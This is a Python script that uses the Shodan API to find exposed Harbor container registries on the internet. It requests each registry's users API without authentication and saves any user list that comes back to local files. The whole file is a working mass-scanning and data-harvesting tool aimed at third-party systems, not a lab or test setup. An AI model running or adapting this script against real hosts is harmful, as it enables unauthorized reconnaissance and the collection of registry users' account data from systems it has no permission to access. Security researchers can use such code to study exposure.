#!/usr/bin/env python3
#
# harbor.py
# Search SHODAN for Harbor container registries exposing the users API
# without authentication. An unauthenticated /api/v2.0/users leaks the user
# list of a registry that typically holds private production images.
#
# Author: random_robbie

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from common import get_api_key, open_output

import shodan
import requests

# Configuration
SEARCH_FOR = 'http.title:"Harbor"'
USERS_PATH = "/api/v2.0/users"
CFG_DIR = "cfg"
session = requests.Session()


def grab_users(ip, port):
    """Check whether the users API answers without authentication."""
    print("[*] Testing: " + ip + " on Port: " + port + "[*]\n")
    try:
        url = "http://" + ip + ":" + port + USERS_PATH
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
            "Connection": "close",
            "Accept": "application/json",
        }
        response = session.get(url, headers=headers, timeout=15, verify=False)
        if response.status_code == 200 and "[" in response.text:
            with open_output(os.path.join(CFG_DIR, ip + "-harbor.json"), "a") as fh:
                fh.write(response.text + "\n")
            print("[*] Harbor user list exposed Whooops.. [*]\n")
        else:
            print("[*] Harbor requires authentication. [*]\n")
    except KeyboardInterrupt:
        sys.exit("Ctrl-c pressed ...")
    except Exception as e:
        print(e)
        print("[*] Nothing Found on IP:" + ip + " [*]\n")


def main():
    api = shodan.Shodan(get_api_key())
    result = api.search(SEARCH_FOR)
    for service in result["matches"]:
        grab_users(service["ip_str"], str(service["port"]))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit("Ctrl-c pressed ...")
    except Exception as e:
        sys.exit("Error: %s" % e)
